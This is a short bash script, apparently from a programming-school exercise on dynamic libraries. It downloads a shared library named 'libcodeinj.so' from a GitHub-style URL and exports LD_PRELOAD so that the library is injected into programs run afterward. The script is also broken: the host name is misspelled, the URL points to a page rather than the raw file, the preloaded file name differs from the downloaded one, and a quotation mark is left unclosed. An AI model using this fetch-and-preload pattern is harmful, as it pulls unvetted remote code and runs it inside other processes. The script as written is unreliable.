#!/bin/bash
wget -P .. https://rawgithubusercontent.com/MSbumex/alx-low_level_programming/blob/master/0x18-dynamic_libraries/libcodeinj.so
export LD_PRELOAD="$PWD/../codeinj.so
